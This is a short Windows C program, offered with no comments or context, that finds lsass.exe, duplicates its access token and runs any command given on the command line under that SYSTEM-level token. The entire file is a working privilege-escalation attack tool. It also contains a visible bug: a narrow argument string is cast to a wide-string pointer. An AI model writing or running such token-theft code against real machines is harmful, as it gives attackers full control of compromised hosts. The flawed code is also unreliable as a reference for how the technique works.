#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return 1;
    }
    
    HANDLE hToken;
    HANDLE hNewToken;
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = INVALID_HANDLE_VALUE;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot Failed: %u\n", GetLastError());
        return 2;
    }

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 3;
    }

    BOOL bResult = FALSE;
    while (Process32Next(hProcessSnap, &pe32)) {
        if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                    bResult = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);
                    CloseHandle(hToken);
                }
                CloseHandle(hProcess);
            }
            break;
        }
    }
    CloseHandle(hProcessSnap);

    if (!bResult) {
        printf("Failed to duplicate token.\n");
        return 4;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessWithTokenW(hNewToken, LOGON_WITH_PROFILE, NULL, (LPWSTR)argv[1], CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("CreateProcessWithTokenW Failed: %u\n", GetLastError());
        CloseHandle(hNewToken);
        return 5;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(hNewToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
